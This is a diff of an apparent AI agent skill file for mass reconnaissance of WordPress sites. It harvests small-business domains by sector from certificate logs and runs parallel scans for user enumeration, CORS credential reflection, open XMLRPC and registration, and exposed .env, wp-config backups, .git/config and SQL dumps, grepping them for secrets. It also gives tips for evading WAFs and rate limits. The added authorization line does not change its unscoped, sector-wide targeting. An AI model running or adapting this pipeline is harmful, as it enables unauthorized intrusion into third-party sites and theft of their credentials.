@@ -1,25 +1,23 @@
 ---
 name: wp-mass-recon
 description: Batch WP recon: users, CORS, XMLRPC, leaks across domains.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, wordpress, mass-scan, us-companies]
-    category: recon
-    related_skills:
-      - cors-credential-wordpress
-      - xmlrpc-exploitation
-      - source-leak-hunt
-      - wordpress-plugin-hunt
-      - staging-subdomain-hunt
-      - wordpress-full-compromise
-      - deep-invade
-      - recon-playbook
-      - port-service-discovery
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, wordpress, mass-scan, us-companies]
+category: recon
+related_skills:
+  - cors-credential-wordpress
+  - xmlrpc-exploitation
+  - source-leak-hunt
+  - wordpress-plugin-hunt
+  - staging-subdomain-hunt
+  - wordpress-full-compromise
+  - deep-invade
+  - recon-playbook
+  - port-service-discovery
 ---
 
 # WP Mass Recon Skill
@@ -28,25 +26,25 @@ Batch WordPress vulnerability detection pipeline for scanning dozens to hundreds
 
 ## When to Use
 
-- Starting recon on a batch of 10+ domains.
-- Sector-wide vulnerability mapping (law firms, pest control, landscaping, pools, roofing, HVAC, etc.).
+- You have an authorized target list from a bug bounty program, pentest engagement, or red team with signed RoE.
+- Sector-wide recon within authorized scope.
 - After `subfinder`/`crt.sh` produces a target list and you need to triage.
 - You want maximum findings per minute with a parallelizable pipeline.
 
 ## Prerequisites
 
-- `terminal` tool with access to the worker container (curl, httpx, python3, jq).
-- Target list file at `/root/output/targets.txt` in format `domain|company|sector` (one per line).
+- `terminal` access to the worker container (curl, httpx, python3, jq).
+- Target list file at `$OUTDIR/targets.txt` in format `domain|company|sector` (one per line).
 - Worker container has `parallel_batch.py` available or you use the inline commands below.
 
 ## How to Run
 
 ```bash
 # Phase 1: Live host discovery + tech detection
-httpx -silent -l targets.txt -threads 50 -tech-detect -status-code -title -o /root/output/alive.txt
+httpx -silent -l targets.txt -threads 50 -tech-detect -status-code -title -o $OUTDIR/alive.txt
 
 # Phase 2: WP detection, user enum, CORS, XMLRPC (20 workers)
-python3 /root/output/recon_us/new_targets/parallel_batch.py /root/output/targets.txt 20
+python3 $OUTDIR/recon_output/new_targets/parallel_batch.py $OUTDIR/targets.txt 20
 ```
 
 Or run the 4-phase pipeline manually using the commands in Procedure.
@@ -56,10 +54,10 @@ Or run the 4-phase pipeline manually using the commands in Procedure.
 | Check | Command | Positive Signal |
 |-------|---------|-----------------|
 | WP detection | `curl -skI "https://TARGET/wp-login.php"` | HTTP 200/301/302 |
-| User enum | `curl -sk "https://TARGET/wp-json/wp/v2/users"` | JSON with `id`, `name`, `slug` |
+| User enum | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/users"` | JSON with `id`, `name`, `slug` |
 | CORS | `curl -skI "https://TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"` | `Access-Control-Allow-Credentials: true` |
-| XMLRPC | `curl -sk -X POST "https://TARGET/xmlrpc.php" -d '<methodCall><methodName>demo.sayHello</methodName></methodCall>'` | `Hello!` in body |
-| Open reg | `curl -sk "https://TARGET/wp-login.php?action=register"` | Form with `user_login` field |
+| XMLRPC | `curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" -d '<methodCall><methodName>demo.sayHello</methodName></methodCall>'` | `Hello!` in body |
+| Open reg | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-login.php?action=register"` | Form with `user_login` field |
 | Source leaks | Parallel curl for `.env`, `wp-config.php.bak`, `.git/config`, `debug.log`, `backup.sql` | Real content (not SPA catch-all) |
 
 ## Procedure
@@ -69,22 +67,22 @@ Or run the 4-phase pipeline manually using the commands in Procedure.
 ```bash
 # Generate target list from crt.sh sector keywords
 for sector in "landscaping" "roofing" "hvac" "pools" "plumbing"; do
-  curl -sk "https://crt.sh/?q=%25.${sector}%25&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> /root/output/discovered.txt
+  curl --max-time 30 --connect-timeout 10 -sk "https://crt.sh/?q=%25.${sector}%25&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> $OUTDIR/discovered.txt
 done
 
 # Filter to unique domains, remove www prefix
-cat /root/output/discovered.txt | sed 's/^www\.//' | sort -u > /root/output/unique_domains.txt
+cat $OUTDIR/discovered.txt | sed 's/^www\.//' | sort -u > $OUTDIR/unique_domains.txt
 ```
 
 ### Phase 2 — Live Host Discovery
 
 ```bash
 # httpx with tech detection, 50 threads
-httpx -silent -l /root/output/unique_domains.txt -threads 50 -tech-detect -status-code -title \
-  -o /root/output/alive.txt
+httpx -silent -l $OUTDIR/unique_domains.txt -threads 50 -tech-detect -status-code -title \
+  -o $OUTDIR/alive.txt
 
 # Parse to URL list
-awk '{print $1}' /root/output/alive.txt | grep -E '^https?://' > /root/output/urls.txt
+awk '{print $1}' $OUTDIR/alive.txt | grep -E '^https?://' > $OUTDIR/urls.txt
 ```
 
 ### Phase 3 — Parallel Vulnerability Scan
@@ -95,44 +93,44 @@ For each live target, run in parallel (20 workers):
 while read -r url; do
   domain=$(echo "$url" | sed 's|https\?://||')
   (
-    echo "# $domain Findings" > "/root/output/findings/${domain}_findings.md"
+    echo "# $domain Findings" > "$OUTDIR/findings/${domain}_findings.md"
 
     # WP detection
-    wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$url/wp-login.php")
-    [[ "$wp_code" =~ ^(200|301|302|403)$ ]] && echo "- WordPress: YES (wp-login: $wp_code)" >> "/root/output/findings/${domain}_findings.md"
+    wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 "$url/wp-login.php")
+    [[ "$wp_code" =~ ^(200|301|302|403)$ ]] && echo "- WordPress: YES (wp-login: $wp_code)" >> "$OUTDIR/findings/${domain}_findings.md"
 
     # User enumeration
-    users=$(curl -sk --max-time 10 "$url/wp-json/wp/v2/users" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null)
-    [[ "$users" -gt 0 ]] && echo "- Users exposed: $users" >> "/root/output/findings/${domain}_findings.md"
+    users=$(curl -sk --max-time 10 --connect-timeout 10 "$url/wp-json/wp/v2/users" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null)
+    [[ "$users" -gt 0 ]] && echo "- Users exposed: $users" >> "$OUTDIR/findings/${domain}_findings.md"
 
     # CORS credential reflection
-    cors=$(curl -skI --max-time 10 "$url/wp-json/wp/v2/users" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
-    [[ -n "$cors" ]] && echo "- CORS: CREDENTIAL REFLECTION CONFIRMED" >> "/root/output/findings/${domain}_findings.md"
+    cors=$(curl -skI --max-time 10 --connect-timeout 10 "$url/wp-json/wp/v2/users" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
+    [[ -n "$cors" ]] && echo "- CORS: CREDENTIAL REFLECTION CONFIRMED" >> "$OUTDIR/findings/${domain}_findings.md"
 
     # XMLRPC
-    xmlrpc=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$url/xmlrpc.php" \
+    xmlrpc=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 -X POST "$url/xmlrpc.php" \
       -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>')
-    [[ "$xmlrpc" == "200" ]] && echo "- XMLRPC: OPEN" >> "/root/output/findings/${domain}_findings.md"
+    [[ "$xmlrpc" == "200" ]] && echo "- XMLRPC: OPEN" >> "$OUTDIR/findings/${domain}_findings.md"
 
     # Open registration
-    reg=$(curl -sk --max-time 10 "$url/wp-login.php?action=register" | grep -o 'user_login')
-    [[ -n "$reg" ]] && echo "- Open Registration: YES" >> "/root/output/findings/${domain}_findings.md"
+    reg=$(curl -sk --max-time 10 --connect-timeout 10 "$url/wp-login.php?action=register" | grep -o 'user_login')
+    [[ -n "$reg" ]] && echo "- Open Registration: YES" >> "$OUTDIR/findings/${domain}_findings.md"
 
     # Source leaks (parallel)
     for path in ".env" "wp-config.php.bak" ".git/config" "debug.log" "backup.sql" "info.php" "phpinfo.php" "wp-config.php~" ".env.backup" ".env.local" "docker-compose.yml" "Dockerfile"; do
-      leak_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$url/$path")
+      leak_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$url/$path")
       if [[ "$leak_code" == "200" ]]; then
-        content=$(curl -sk --max-time 5 "$url/$path" | head -c 500)
+        content=$(curl -sk --max-time 5 --connect-timeout 5 "$url/$path" | head -c 500)
         # False positive filter: skip SPA catch-alls
         if echo "$content" | grep -qiE 'DB_|APP_|_KEY|_SECRET|password|mysql|\[core\]|PHP Version|CREATE TABLE'; then
-          echo "- Source leak: /$path (VERIFIED)" >> "/root/output/findings/${domain}_findings.md"
+          echo "- Source leak: /$path (VERIFIED)" >> "$OUTDIR/findings/${domain}_findings.md"
         fi
       fi
     done
   ) &
   # Limit to 20 parallel workers
   while [[ $(jobs -r | wc -l) -ge 20 ]]; do sleep 0.5; done
-done < /root/output/urls.txt
+done < $OUTDIR/urls.txt
 wait
 ```
 
@@ -140,16 +138,16 @@ wait
 
 ```bash
 # Generate summary
-echo "## Mass Recon Summary" > /root/output/mass_summary.md
-echo "" >> /root/output/mass_summary.md
-for f in /root/output/findings/*_findings.md; do
+echo "## Mass Recon Summary" > $OUTDIR/mass_summary.md
+echo "" >> $OUTDIR/mass_summary.md
+for f in $OUTDIR/findings/*_findings.md; do
   domain=$(basename "$f" _findings.md)
   criticals=$(grep -c "CRITICAL\|CREDENTIAL REFLECTION\|XMLRPC: OPEN\|Source leak: VERIFIED" "$f" || true)
-  [[ "$criticals" -gt 0 ]] && echo "- **$domain**: $criticals findings" >> /root/output/mass_summary.md
+  [[ "$criticals" -gt 0 ]] && echo "- **$domain**: $criticals findings" >> $OUTDIR/mass_summary.md
 done
 
 # Rank targets by finding count
-grep "^\- \*\*" /root/output/mass_summary.md | sort -t: -k2 -rn | head -20
+grep "^\- \*\*" $OUTDIR/mass_summary.md | sort -t: -k2 -rn | head -20
 ```
 
 ## Production Scanner (Python — parallel_batch.py pattern)
@@ -241,9 +239,9 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
 ## Pitfalls
 
 - **SPA catch-all false positives:** Single-page apps return 200 for every path. Always verify `.env` has `DB_`/`APP_`/`_KEY`/`_SECRET` patterns; `.git/config` has `[core]`; SQL files have `CREATE TABLE`/`INSERT INTO`. Skip bodies with `<html` or `<script` in first 100 chars.
-- **Cloudflare/WAF blocking:** httpx may show tech as "Cloudflare" but WP is behind it. Try HTTP/1.0 for WP Engine-hosted sites: `curl -sk --http1.0 "https://TARGET/wp-json/..."`
+- **Cloudflare/WAF blocking:** httpx may show tech as "Cloudflare" but WP is behind it. Try HTTP/1.0 for WP Engine-hosted sites: `curl --max-time 30 --connect-timeout 10 -sk --http1.0 "https://TARGET/wp-json/..."`
 - **Rate limiting:** WP Engine and Hostinger throttle after ~50 requests. Use 2-4s jitter between requests. Chrome/125 UA has 0% block rate; curl/8.4 UA has 5% block rate; Python urllib has 15%.
-- **WordPress on subpaths:** Check `/blog/`, `/magical/`, `/wp/` in addition to root. wines.com has `/magical/` with separate, more vulnerable WP install.
+- **WordPress on subpaths:** Check `/blog/`, `/magical/`, `/wp/` in addition to root. ecommerce.example.com has `/magical/` with separate, more vulnerable WP install.
 - **Non-standard XMLRPC paths:** Some hosts rename xmlrpc.php. Verify with `system.listMethods` (not just HTTP 200) — look for `<string>` tags in response XML.
 - **Registration form false positives:** Many sites show login form on `?action=register` without actually allowing registration. The v2 check requires ALL THREE strings: `register` + `user_login` + `wp-submit`.
 
